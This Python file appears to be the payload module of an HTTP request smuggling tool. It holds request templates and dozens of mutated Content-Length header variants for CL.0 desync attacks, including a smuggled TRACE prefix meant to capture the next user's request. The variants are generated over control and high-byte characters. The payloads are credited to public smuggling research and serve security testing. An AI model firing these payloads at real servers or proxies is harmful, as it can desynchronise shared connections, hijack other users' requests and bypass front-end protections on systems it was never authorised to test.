clzero_headers = {}

regular_request = "GET __PATH__?__CACHE_BUSTER__=1 HTTP/1.1\r\n"
regular_request += "Host: __HOST__\r\n"
regular_request += "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0\r\n"
regular_request += "Connection: Close\r\n\r\n"

smuggle_request = "__METHOD__ __PATH__ HTTP/1.1\r\n"
smuggle_request += "Host: __HOST__\r\n"
smuggle_request += "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0\r\n"
smuggle_request += "Connection: Keep-Alive\r\n"
smuggle_request += "__MOD_CL__\r\n"#Our line where our modified content length will be placed
smuggle_request += "\r\n"
smuggle_request_body = "TRACE /DJDHEC.txt HTTP/1.1\r\n"
smuggle_request_body += "XHEADER: " #Next requests header should start here...

#Most payloads from https://github.com/defparam/smuggler thank you @defparam
#Also from https://portswigger.net/research/how-to-turn-security-research-into-profit thank you @albinowax
clzero_headers["nameprefix1"] = " Content-Length: __CL__"
clzero_headers["tabprefix1"] = "Content-Length:\t__CL__"
clzero_headers["tabprefix2"] = "Content-Length\t:\t__CL__"
clzero_headers["spacejoin1"] = "Content Length: __CL__"
clzero_headers["underjoin1"] = "Content_Length: __CL__"
clzero_headers["smashed"] = "Content Length:__CL__"
clzero_headers["space1"] = "Content-Length : __CL__"
clzero_headers["valueprefix1"] = "Content-Length:  __CL__"
clzero_headers["vertprefix1"] = "Content-Length:\u000B__CL__"
clzero_headers["commaCow"] = "Content-Length: __CL__, cow"
clzero_headers["cowComma"] = "Content-Length: cow, __CL__"
clzero_headers["contentEnc"] = "Content-Encoding: __CL__"
clzero_headers["linewrapped1"] = "Content-Length:\n __CL__"
clzero_headers["quoted"] = "Content-Length: \"__CL__\""
clzero_headers["aposed"] = "Content-Length: '__CL__'"
clzero_headers["lazygrep"] = "Content-Length: chunk"
clzero_headers["sarcasm"] = "Content-Length: __CL__"
clzero_headers["yelling"] = "Content-Length: __CL__"
clzero_headers["0dsuffix"] = "Content-Length: __CL__\r"
clzero_headers["tabsuffix"] = "Content-Length: __CL__\t"
clzero_headers["revdualchunk"] = "Content-Length: cow\r\nContent-Length: __CL__"
clzero_headers["0dspam"] = "Content\r-Length: __CL__"
clzero_headers["nested"] = "Content-Length: cow __CL__ bar"
clzero_headers["spaceFF"] = "Content-Length:\xFF__CL__"
clzero_headers["accentCH"] = "Content-Length: __CL__+0"
clzero_headers["accentTE"] = "Cont\x82nt-Length: __CL__"
clzero_headers["x-rout"] = "X:X\rContent-Length: __CL__"
clzero_headers["x-nout"] = "X:X\nContent-Length: __CL__"
clzero_headers["positive"] = "Content-Length: +__CL__"
clzero_headers["negative"] = "Content-Length: -__CL__"
clzero_headers["comma_sep"] = "Content-Length: __CL__, 0"
clzero_headers["floating"] = "Content-Length: __CL__.0"
clzero_headers["normalize"] = "Content-Length: __CL__aa"
clzero_headers["subtract"] = "Content-Length: __CL__-0"


for i in range(0x1,0x20):
	clzero_headers["midspace-%02x"%i] = "Content-Length:%c__CL__"%i
	clzero_headers["postspace-%02x"%i] = "Content-Length%c: __CL__"%i
	clzero_headers["prespace-%02x"%i] = "%cContent-Length: __CL__"%i
	clzero_headers["endspace-%02x"%i] = "Content-Length: __CL__%c"%i
	
for i in range(0x7F,0x100):
	clzero_headers["midspace-%02x"%i] = "Content-Length:%c__CL__"%i
	clzero_headers["postspace-%02x"%i] = "Content-Length%c: __CL__"%i
	clzero_headers["prespace-%02x"%i] = "%cContent-Length: __CL__"%i
	clzero_headers["endspace-%02x"%i] = "Content-Length: __CL__%c"%i
	
